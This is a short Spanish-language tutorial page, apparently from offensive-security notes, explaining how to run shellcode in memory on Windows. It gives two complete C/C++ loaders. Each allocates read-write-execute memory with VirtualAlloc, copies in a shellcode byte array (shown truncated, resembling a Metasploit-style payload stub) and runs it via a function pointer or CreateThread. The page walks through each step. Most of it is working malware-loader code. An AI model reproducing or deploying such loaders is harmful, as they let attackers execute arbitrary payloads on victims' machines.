# Shellcode Execution C++

Esta es la forma más simple de ejecutar shellcode en memoria, los pasos para lograr esto son los siguientes:

1. Almacenar el shellcode en una variable
2. Crear un espacio de memoria para este shellcode
3. Ejecutarlo

```c
#include "windows.h"

int main()
{
    unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    ...
    "\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
    "\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff"
    "\xd5";


    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();

    return 0;
}

```



**\*exec** es un puntero a la dirección que nos retornará **VirtualAlloc.** Esta dirección tendrá el espacio del shellcode y permisos de lectura, escritura y ejecución.&#x20;

Con **memcpy** copiaremos el contenido del shellcode hacia la dirección \*exec.

**((void(\*)()) exec)();** Esto lo que hace es, como en **exec** tenemos definido nuestro shellcode, es castear este bytearray a un function pointer con **void(\*)() exec,** se hace esto por que al llamar a esta función (sin argumentos por que así se la definió) ejecutara los bytes, ya que el compilador los interpretará como código máquina. Esto se hace con el paréntesis del final, es decir ejecutamos la función.



## Otra forma

```c
#include <Windows.h>

void main()
{
	const char shellcode[] = 
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
	    	"\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
	    				  ...
	    	"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"
	   	 "\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff"
	    	"\xd5";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
```







{% embed url="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc" %}
